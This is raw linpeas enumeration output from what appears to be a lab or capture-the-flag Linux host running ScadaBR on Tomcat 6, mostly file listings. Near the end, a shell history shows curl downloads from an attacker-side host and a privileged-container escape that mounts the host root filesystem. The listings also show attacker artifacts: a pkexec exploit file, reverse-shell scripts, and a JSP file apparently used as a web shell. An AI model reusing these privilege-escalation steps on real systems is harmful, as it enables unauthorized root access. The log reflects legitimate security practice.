/opt/java/jre1.6.0_45/lib/zi/Africa/Algiers
/opt/java/jre1.6.0_45/lib/zi/Africa/Asmara
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/America
/opt/java/jre1.6.0_45/lib/zi/America/Adak
/opt/java/jre1.6.0_45/lib/zi/America/Anchorage
/opt/java/jre1.6.0_45/lib/zi/America/Anguilla
/opt/java/jre1.6.0_45/lib/zi/America/Antigua
/opt/java/jre1.6.0_45/lib/zi/America/Araguaina
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/America/Argentina/Buenos_Aires
/opt/java/jre1.6.0_45/lib/zi/America/Argentina/Catamarca
/opt/java/jre1.6.0_45/lib/zi/America/Argentina/Cordoba
/opt/java/jre1.6.0_45/lib/zi/America/Argentina/Jujuy
/opt/java/jre1.6.0_45/lib/zi/America/Argentina/La_Rioja
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/America/Aruba
/opt/java/jre1.6.0_45/lib/zi/America/Asuncion
/opt/java/jre1.6.0_45/lib/zi/America/Atikokan
/opt/java/jre1.6.0_45/lib/zi/America/Bahia
/opt/java/jre1.6.0_45/lib/zi/America/Bahia_Banderas
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/America/Indiana/Indianapolis
/opt/java/jre1.6.0_45/lib/zi/America/Indiana/Knox
/opt/java/jre1.6.0_45/lib/zi/America/Indiana/Marengo
/opt/java/jre1.6.0_45/lib/zi/America/Indiana/Petersburg
/opt/java/jre1.6.0_45/lib/zi/America/Indiana/Tell_City
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/America/Inuvik
/opt/java/jre1.6.0_45/lib/zi/America/Iqaluit
/opt/java/jre1.6.0_45/lib/zi/America/Jamaica
/opt/java/jre1.6.0_45/lib/zi/America/Juneau
/opt/java/jre1.6.0_45/lib/zi/America/Kentucky
/opt/java/jre1.6.0_45/lib/zi/America/Kentucky/Louisville
/opt/java/jre1.6.0_45/lib/zi/America/Kentucky/Monticello
/opt/java/jre1.6.0_45/lib/zi/America/La_Paz
/opt/java/jre1.6.0_45/lib/zi/America/Lima
/opt/java/jre1.6.0_45/lib/zi/America/Los_Angeles
/opt/java/jre1.6.0_45/lib/zi/America/Maceio
/opt/java/jre1.6.0_45/lib/zi/America/Managua
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/America/North_Dakota/Beulah
/opt/java/jre1.6.0_45/lib/zi/America/North_Dakota/Center
/opt/java/jre1.6.0_45/lib/zi/America/North_Dakota/New_Salem
/opt/java/jre1.6.0_45/lib/zi/America/Ojinaga
/opt/java/jre1.6.0_45/lib/zi/America/Panama
/opt/java/jre1.6.0_45/lib/zi/America/Pangnirtung
/opt/java/jre1.6.0_45/lib/zi/America/Paramaribo
/opt/java/jre1.6.0_45/lib/zi/America/Phoenix
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/Antarctica
/opt/java/jre1.6.0_45/lib/zi/Antarctica/Casey
/opt/java/jre1.6.0_45/lib/zi/Antarctica/Davis
/opt/java/jre1.6.0_45/lib/zi/Antarctica/DumontDUrville
/opt/java/jre1.6.0_45/lib/zi/Antarctica/Macquarie
/opt/java/jre1.6.0_45/lib/zi/Antarctica/Mawson
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/Asia
/opt/java/jre1.6.0_45/lib/zi/Asia/Aden
/opt/java/jre1.6.0_45/lib/zi/Asia/Almaty
/opt/java/jre1.6.0_45/lib/zi/Asia/Amman
/opt/java/jre1.6.0_45/lib/zi/Asia/Anadyr
/opt/java/jre1.6.0_45/lib/zi/Asia/Aqtau
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/Atlantic
/opt/java/jre1.6.0_45/lib/zi/Atlantic/Azores
/opt/java/jre1.6.0_45/lib/zi/Atlantic/Bermuda
/opt/java/jre1.6.0_45/lib/zi/Atlantic/Canary
/opt/java/jre1.6.0_45/lib/zi/Atlantic/Cape_Verde
/opt/java/jre1.6.0_45/lib/zi/Atlantic/Faroe
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/Australia
/opt/java/jre1.6.0_45/lib/zi/Australia/Adelaide
/opt/java/jre1.6.0_45/lib/zi/Australia/Brisbane
/opt/java/jre1.6.0_45/lib/zi/Australia/Broken_Hill
/opt/java/jre1.6.0_45/lib/zi/Australia/Currie
/opt/java/jre1.6.0_45/lib/zi/Australia/Darwin
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/CET
/opt/java/jre1.6.0_45/lib/zi/CST6CDT
/opt/java/jre1.6.0_45/lib/zi/EET
/opt/java/jre1.6.0_45/lib/zi/EST
/opt/java/jre1.6.0_45/lib/zi/EST5EDT
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/Etc/GMT
/opt/java/jre1.6.0_45/lib/zi/Etc/GMT-1
/opt/java/jre1.6.0_45/lib/zi/Etc/GMT+1
/opt/java/jre1.6.0_45/lib/zi/Etc/GMT-10
/opt/java/jre1.6.0_45/lib/zi/Etc/GMT+10
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/Europe
/opt/java/jre1.6.0_45/lib/zi/Europe/Amsterdam
/opt/java/jre1.6.0_45/lib/zi/Europe/Andorra
/opt/java/jre1.6.0_45/lib/zi/Europe/Athens
/opt/java/jre1.6.0_45/lib/zi/Europe/Belgrade
/opt/java/jre1.6.0_45/lib/zi/Europe/Berlin
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/GMT
/opt/java/jre1.6.0_45/lib/zi/HST
/opt/java/jre1.6.0_45/lib/zi/Indian
/opt/java/jre1.6.0_45/lib/zi/Indian/Antananarivo
/opt/java/jre1.6.0_45/lib/zi/Indian/Chagos
/opt/java/jre1.6.0_45/lib/zi/Indian/Christmas
/opt/java/jre1.6.0_45/lib/zi/Indian/Cocos
/opt/java/jre1.6.0_45/lib/zi/Indian/Comoro
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/MET
/opt/java/jre1.6.0_45/lib/zi/MST
/opt/java/jre1.6.0_45/lib/zi/MST7MDT
/opt/java/jre1.6.0_45/lib/zi/Pacific
/opt/java/jre1.6.0_45/lib/zi/Pacific/Apia
/opt/java/jre1.6.0_45/lib/zi/Pacific/Auckland
/opt/java/jre1.6.0_45/lib/zi/Pacific/Chatham
/opt/java/jre1.6.0_45/lib/zi/Pacific/Chuuk
/opt/java/jre1.6.0_45/lib/zi/Pacific/Easter
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/PST8PDT
/opt/java/jre1.6.0_45/lib/zi/SystemV
/opt/java/jre1.6.0_45/lib/zi/SystemV/AST4
/opt/java/jre1.6.0_45/lib/zi/SystemV/AST4ADT
/opt/java/jre1.6.0_45/lib/zi/SystemV/CST6
/opt/java/jre1.6.0_45/lib/zi/SystemV/CST6CDT
/opt/java/jre1.6.0_45/lib/zi/SystemV/EST5
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/lib/zi/WET
/opt/java/jre1.6.0_45/lib/zi/ZoneInfoMappings
/opt/java/jre1.6.0_45/LICENSE
/opt/java/jre1.6.0_45/man
/opt/java/jre1.6.0_45/man/ja_JP.eucJP
/opt/java/jre1.6.0_45/man/ja_JP.eucJP/man1
/opt/java/jre1.6.0_45/man/ja_JP.eucJP/man1/java.1
/opt/java/jre1.6.0_45/man/ja_JP.eucJP/man1/keytool.1
/opt/java/jre1.6.0_45/man/ja_JP.eucJP/man1/orbd.1
/opt/java/jre1.6.0_45/man/ja_JP.eucJP/man1/pack200.1
/opt/java/jre1.6.0_45/man/ja_JP.eucJP/man1/policytool.1
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/man/man1
/opt/java/jre1.6.0_45/man/man1/java.1
/opt/java/jre1.6.0_45/man/man1/keytool.1
/opt/java/jre1.6.0_45/man/man1/orbd.1
/opt/java/jre1.6.0_45/man/man1/pack200.1
/opt/java/jre1.6.0_45/man/man1/policytool.1
#)You_can_write_even_more_files_inside_last_directory

/opt/java/jre1.6.0_45/plugin
/opt/java/jre1.6.0_45/plugin/desktop
/opt/java/jre1.6.0_45/plugin/desktop/sun_java.desktop
/opt/java/jre1.6.0_45/README
/opt/java/jre1.6.0_45/.systemPrefs
/opt/java/jre1.6.0_45/.systemPrefs/.system.lock
/opt/java/jre1.6.0_45/.systemPrefs/.systemRootModFile
/opt/java/jre1.6.0_45/THIRDPARTYLICENSEREADME.txt
/opt/java/jre1.6.0_45/Welcome.html
/opt/java/jre-6u45-linux-x64.bin
/opt/tomcat6
/opt/tomcat6/apache-tomcat-6.0.53
/opt/tomcat6/apache-tomcat-6.0.53/bin
/opt/tomcat6/apache-tomcat-6.0.53/bin/bootstrap.jar
/opt/tomcat6/apache-tomcat-6.0.53/bin/catalina.bat
/opt/tomcat6/apache-tomcat-6.0.53/bin/catalina.sh
/opt/tomcat6/apache-tomcat-6.0.53/bin/catalina-tasks.xml
/opt/tomcat6/apache-tomcat-6.0.53/bin/commons-daemon.jar
#)You_can_write_even_more_files_inside_last_directory

/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/dbex.lck
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/db.lck
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/log
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/log/log1.dat
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/log/log.ctrl
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/log/logmirror.ctrl
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/seg0
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/seg0/c101.dat
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/seg0/c10.dat
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/seg0/c111.dat
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/seg0/c121.dat
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/seg0/c130.dat
#)You_can_write_even_more_files_inside_last_directory

/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/service.properties
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/tmp
/opt/tomcat6/apache-tomcat-6.0.53/bin/setclasspath.bat
/opt/tomcat6/apache-tomcat-6.0.53/bin/setclasspath.sh
/opt/tomcat6/apache-tomcat-6.0.53/bin/shutdown.bat
/opt/tomcat6/apache-tomcat-6.0.53/bin/shutdown.sh
/opt/tomcat6/apache-tomcat-6.0.53/bin/startup.bat
#)You_can_write_even_more_files_inside_last_directory

/opt/tomcat6/apache-tomcat-6.0.53/conf
/opt/tomcat6/apache-tomcat-6.0.53/conf/Catalina
/opt/tomcat6/apache-tomcat-6.0.53/conf/Catalina/localhost
/opt/tomcat6/apache-tomcat-6.0.53/conf/Catalina/localhost/host-manager.xml
/opt/tomcat6/apache-tomcat-6.0.53/conf/Catalina/localhost/manager.xml
/opt/tomcat6/apache-tomcat-6.0.53/conf/catalina.policy
/opt/tomcat6/apache-tomcat-6.0.53/conf/catalina.properties
/opt/tomcat6/apache-tomcat-6.0.53/conf/context.xml
/opt/tomcat6/apache-tomcat-6.0.53/conf/logging.properties
/opt/tomcat6/apache-tomcat-6.0.53/conf/server.xml
#)You_can_write_even_more_files_inside_last_directory

/opt/tomcat6/apache-tomcat-6.0.53/lib
/opt/tomcat6/apache-tomcat-6.0.53/lib/annotations-api.jar
/opt/tomcat6/apache-tomcat-6.0.53/lib/catalina-ant.jar
/opt/tomcat6/apache-tomcat-6.0.53/lib/catalina-ha.jar
/opt/tomcat6/apache-tomcat-6.0.53/lib/catalina.jar
/opt/tomcat6/apache-tomcat-6.0.53/lib/catalina-tribes.jar
#)You_can_write_even_more_files_inside_last_directory

/opt/tomcat6/apache-tomcat-6.0.53/LICENSE
/opt/tomcat6/apache-tomcat-6.0.53/logs
/opt/tomcat6/apache-tomcat-6.0.53/logs/catalina.2024-02-19.log
/opt/tomcat6/apache-tomcat-6.0.53/logs/catalina.2024-03-12.log
/opt/tomcat6/apache-tomcat-6.0.53/logs/catalina.2024-03-13.log
/opt/tomcat6/apache-tomcat-6.0.53/logs/catalina.2024-03-20.log
/opt/tomcat6/apache-tomcat-6.0.53/logs/catalina.2024-03-22.log
#)You_can_write_even_more_files_inside_last_directory

/opt/tomcat6/apache-tomcat-6.0.53/NOTICE
/opt/tomcat6/apache-tomcat-6.0.53/RELEASE-NOTES
/opt/tomcat6/apache-tomcat-6.0.53/RUNNING.txt
/opt/tomcat6/apache-tomcat-6.0.53.tar.gz
/opt/tomcat6/apache-tomcat-6.0.53/temp
/opt/tomcat6/apache-tomcat-6.0.53/temp/safeToDelete.tmp
/opt/tomcat6/apache-tomcat-6.0.53/temp/tomcat.pid
/opt/tomcat6/apache-tomcat-6.0.53/webapps
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/aio.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/api
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/api/index.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/build.xml.txt
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/deployment.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/index.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/installation.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/introduction.html
#)You_can_write_even_more_files_inside_last_directory

/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/build.xml
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/docs
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/docs/README.txt
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/index.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/sample.war
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/src
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/src/mypackage
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/src/mypackage/Hello.java
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/web
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/web/hello.jsp
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/web/images
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/web/index.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/web/WEB-INF
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/sample/web/WEB-INF/web.xml
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/source.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/appdev/web.xml.txt
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/apr.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/architecture
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/architecture/index.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/architecture/overview.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/architecture/requestProcess
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/architecture/requestProcess.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/architecture/requestProcess/roseModel.mdl
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/architecture/startup
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/architecture/startup.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/architecture/startup/serverStartup.txt
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/balancer-howto.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/building.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/BUILDING.txt
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/cgi-howto.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/changelog.html
#)You_can_write_even_more_files_inside_last_directory

/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/config/ajp.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/config/cluster-channel.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/config/cluster-deployer.html
/opt/tomcat6/apache-tomcat-6.0.53/webapps/docs/config/cluster.html

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2024-06-11+15:57:56.9596491130 /home/aepike/.arsic/pspy
2024-06-11+15:57:37.3636499680 /home/aepike/.arsic/linpeas
2024-06-11+15:56:54.0356518590 /home/aepike/.arsic/GCONV_PATH=./.pkexec
2024-06-11+15:56:44.3076522840 /home/aepike/.arsic/pwnme
2024-02-19+16:15:27.3041050650 /opt/tomcat6/apache-tomcat-6.0.53.tar.gz
2024-02-19+16:15:18.5119768350 /opt/java/jre-6u45-linux-x64.bin
2020-04-13+17:04:53.5609862040 /etc/console-setup/cached_setup_terminal.sh
2020-04-13+17:04:53.5609862040 /etc/console-setup/cached_setup_keyboard.sh
2020-04-13+17:04:53.5609862040 /etc/console-setup/cached_setup_font.sh
2020-04-13+16:58:15.7957152660 /etc/network/if-up.d/mtuipv6
2020-04-13+16:58:15.7957152660 /etc/network/if-pre-up.d/mtuipv6

╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  4 aepike aepike 4096 Apr 10 16:02 .
drwxr-xr-x 24 root   root   4096 Apr 10 16:02 ..
drwxr-xr-x  3 aepike aepike 4096 Apr 10 16:02 java
drwxr-xr-x  3 aepike aepike 4096 Apr 10 16:02 tomcat6

╔══════════╣ Unexpected in root
/initrd.img.old
/initrd.img
/vmlinuz.old
/vmlinuz

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/tmp/hsperfdata_aepike/1276
/home/aepike/.config/lxc/cookies
/opt/tomcat6/apache-tomcat-6.0.53/bin/scadabrDB/log/log1.dat
/var/log/journal/b096528d39394cc28edb2866b98723d6/user-1000.journal
/var/log/journal/b096528d39394cc28edb2866b98723d6/system.journal
/var/log/nginx/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/syslog
/var/log/lxd/privesc/lxc.log


╔══════════╣ Files inside /home/aepike (limit 20)
total 48
drwxr-xr-x 7 aepike aepike 4096 Jun 11 19:37 .
drwxr-xr-x 4 root   root   4096 Apr 10 16:02 ..
drwxr-xr-x 4 aepike aepike 4096 Jun 11 16:33 .arsic
-rw------- 1 aepike aepike 3097 Jun 11 19:41 .bash_history
-rw-r--r-- 1 aepike aepike  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 aepike aepike 3771 Apr  4  2018 .bashrc
drwxr-xr-x 3 aepike aepike 4096 Jun 11 19:38 .cache
drwxr-x--- 3 aepike aepike 4096 Jun 11 16:01 .config
-rw-r--r-- 1 root   root     48 Feb 19 16:08 flag.txt
drwx------ 3 aepike aepike 4096 Jun 11 16:01 .gnupg
-rw-r--r-- 1 aepike aepike  807 Apr  4  2018 .profile
drwxr-xr-x 2 aepike aepike 4096 Jun 11 19:38 .ssh

╔══════════╣ Files inside others home (limit 20)
/var/www/html/index.nginx-debian.html

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2765 Aug  5  2019 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 8881 Jul 30  2021 /lib/modules/4.15.0-154-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9081 Jul 30  2021 /lib/modules/4.15.0-154-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 8881 Jun 16  2023 /lib/modules/4.15.0-213-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9081 Jun 16  2023 /lib/modules/4.15.0-213-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 292 Jun 10 23:10 /run/blkid/blkid.tab.old
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 11755 Apr  2 12:14 /usr/share/info/dir.old
-rw-r--r-- 1 root root 35544 Sep 19  2022 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 1391 Apr  2 12:11 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
-rw-r--r-- 1 root root 1802 Aug 15  2022 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 217569 Jun 16  2023 /usr/src/linux-headers-4.15.0-213-generic/.config.old
-rw-r--r-- 1 root root 0 Jun 16  2023 /usr/src/linux-headers-4.15.0-213-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jun 16  2023 /usr/src/linux-headers-4.15.0-213-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 217425 Jul 30  2021 /usr/src/linux-headers-4.15.0-154-generic/.config.old
-rw-r--r-- 1 root root 0 Jul 30  2021 /usr/src/linux-headers-4.15.0-154-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jul 30  2021 /usr/src/linux-headers-4.15.0-154-generic/include/config/wm831x/backup.h

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/images/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/images/viconics/VT7200/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/images/viconics/VT7300/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/images/viconics/VT7600/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/resources/dojo/tests/widget/images/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/uploads/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /snap/core/16574/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /snap/core/16928/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Apr 10 16:02 .
drwxr-xr-x 14 root root 4.0K Apr 10 16:02 ..
drwxr-xr-x  2 root root 4.0K Apr 10 16:02 html

/var/www/html:
total 12K
drwxr-xr-x 2 root root 4.0K Apr 10 16:02 .
drwxr-xr-x 3 root root 4.0K Apr 10 16:02 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw------- 1 root root 0 Dec  1  2023 /snap/core/16574/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/16574/etc/skel/.bash_logout
-rw------- 1 root root 0 Feb 18 19:55 /snap/core/16928/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/16928/etc/skel/.bash_logout
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw------- 1 root root 0 Aug  5  2019 /etc/.pwd.lock
-rw-r--r-- 1 root root 1531 Apr  2 12:14 /etc/apparmor.d/cache/.features
-rwxr-xr-x 1 aepike aepike 0 Jun 11 15:56 /home/aepike/.arsic/GCONV_PATH=./.pkexec
-rw-r--r-- 1 aepike aepike 220 Apr  4  2018 /home/aepike/.bash_logout
-rw-r--r-- 1 aepike aepike 0 Feb 19 16:08 /opt/java/jre1.6.0_45/.systemPrefs/.systemRootModFile
-rw-r--r-- 1 aepike aepike 0 Feb 19 16:08 /opt/java/jre1.6.0_45/.systemPrefs/.system.lock
-rw-r--r-- 1 aepike aepike 77 Sep 29  2011 /opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/WEB-INF/dox/pt/.directory
-rw-r--r-- 1 aepike aepike 1406 Sep 29  2011 /opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/images/.favicon.ico
-rw-r--r-- 1 landscape landscape 0 Aug  5  2019 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 1531 Apr 13  2020 /var/cache/apparmor/.features
-rw-r--r-- 1 root root 37 Jun 10 23:10 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Jun 10 23:10 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 root root 0 Jun 10 23:10 /run/network/.ifstate.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 aepike aepike 59 Jun 11 15:48 /tmp/rev.sh
-rw------- 1 aepike aepike 32768 Jun 17 17:21 /tmp/hsperfdata_aepike/1276
-rw-r--r-- 1 aepike aepike 1497 Jun 17 16:52 /tmp/blue.jsp
-rw-r--r-- 1 aepike aepike 47 Jun 17 17:00 /tmp/rev2.sh
-rw-r--r-- 1 root root 2099 Nov  3  2023 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 51200 Apr  4 06:25 /var/backups/alternatives.tar.0

╔══════════╣ Searching passwords in history files
/home/aepike/.bash_history:curl http://172.16.0.21:8080/linpeas.sh
/home/aepike/.bash_history:curl http://172.16.0.21:8080/linpeas.sh -o linpeas
/home/aepike/.bash_history:chmod +x linpeas
/home/aepike/.bash_history:sudo -l
/home/aepike/.bash_history:./linpeas
/home/aepike/.bash_history:sudo su
/home/aepike/.bash_history:grep -Ri password
/home/aepike/.bash_history:./linpeas > linOut.txt
/home/aepike/.bash_history:curl http://172.16.0.21:8080/rootfs.squashfs -o rootfs.squashfs
/home/aepike/.bash_history:lxc image impiort incus.tar.xz rootfs.squashfs --alias alpine
/home/aepike/.bash_history:lxd image import incus.tar.xz rootfs.squashfs --alias alpine
/home/aepike/.bash_history:lxc image import incus.tar.xz rootfs.squashfs alias alpine
/home/aepike/.bash_history:lxc image import incus.tar.xz rootfs.squashfs --alias alpine
/home/aepike/.bash_history:lxc init images:alpine/3.12 privesc -c security.privileged=true -s rootmwe
/home/aepike/.bash_history:lxc init images:alpine/3.12 privesc -c security.privileged=true -s rootme
/home/aepike/.bash_history:lxc image import incus.tar.xz rootfs.squashfs --alias alpine
/home/aepike/.bash_history:lxc init alpine privesc -c security.privileged=true -s rootme
/home/aepike/.bash_history:lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/opt/java/jre1.6.0_45/lib/management/jmxremote.password.template
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc

